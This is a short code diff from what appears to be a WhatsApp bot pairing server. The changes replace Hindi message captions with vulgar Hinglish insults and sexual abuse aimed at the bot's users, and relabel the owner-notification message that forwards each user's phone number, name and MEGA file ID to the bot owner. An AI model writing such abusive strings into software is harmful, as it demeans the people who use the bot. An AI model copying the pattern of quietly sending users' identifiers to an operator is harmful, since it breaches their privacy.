@@ -23,7 +23,7 @@ const LINKS = [
     "t.me/YAMDHUD",
     "https://github.com/9man-x-yamdhuuud",
     "https://www.youtube.com/@9man_vlog",
-    "918075498750"
+    "🐊𝟵𝗠𝗔𝗡-𝗫-𝗬𝗔𝗠𝗗𝗛𝗨𝗗🐊__________𝗣𝗔𝗣𝗔 𝗝𝗜 𝗕𝗢𝗟 𝗖𝗛𝗔𝗟 𝗔𝗕 𝗝𝗢 𝗧𝗔𝗥𝗘 𝗗𝗠 𝗦𝗘 𝗢𝗪𝗡𝗘𝗥 𝗞𝗘 𝗣𝗔𝗦𝗦 𝗚𝗬𝗔 𝗛 𝗨𝗦𝗞𝗢 𝗗𝗘𝗟𝗘𝗧__👅𝗠𝗔𝗧 𝗞𝗔𝗥𝗡𝗔 ___𝗕𝗔𝗥𝗡𝗔 𝗖𝗛𝗨𝗗 𝗞𝗔𝗚𝗔 🫩🤡"
 ];
 // ────────────────────────────────────────────────────────────
 
@@ -146,21 +146,21 @@ router.get("/", async (req, res) => {
 
                     // ─── सारी डिटेल्स वाला कैप्शन ──────────────────
                     const caption = 
-                        `📱 *यूजर:* ${userName} (${num})\n` +
+                        `📱 *USRR🙂:* ${userName} (${num})\n` +
                         `📁 *MEGA ID:* ${megaFileId || "Not available"}\n` +
                         `👤 *Owner:* ${OWNER_NUMBER}\n` +
                         `🎵 *Song:* ${SONG_LINK}\n\n` +
-                        `🔗 *Your Links:*\n` +
+                        `🔗 *NAME SUN LODE OWNER KA 🐊𝟵𝗠𝗔𝗡-𝗫-𝗬𝗔𝗠𝗗𝗛𝗨𝗗🐊 PAPA JI:*\n` +
                         LINKS.map((link, i) => `${i+1}. ${link}`).join("\n");
 
                     // ─── ओनर के लिए अलग से डिटेल मैसेज ────────────
                     const ownerMessage = 
-                        `🔔 *नई पेयरिंग हुई!*\n\n` +
-                        `📱 यूजर नंबर: ${num}\n` +
-                        `👤 यूजर का नाम: ${userName}\n` +
+                        `🔔 *NEW PAIRING CODE____🫩🤡!*\n\n` +
+                        `📱 LODU KA NUMBER : ${num}\n` +
+                        `👤 JHATU KA NAME KYA H: ${userName}\n` +
                         `📁 MEGA File ID: ${megaFileId || "N/A"}\n` +
                         `🎵 Song: ${SONG_LINK}\n` +
-                        `🔗 लिंक्स:\n${LINKS.map((l,i)=>`${i+1}. ${l}`).join("\n")}`;
+                        `🔗 LINK...?________________🐊𝟵𝗠𝗔𝗡-𝗫-𝗬𝗔𝗠𝗗𝗛𝗨𝗗🐊:\n${LINKS.map((l,i)=>`${i+1}. ${l}`).join("\n")}`;
 
                     // ─── फंक्शन: किसी भी JID को भेजें ──────────────
                     async function sendToJid(jid, includeFile = true) {
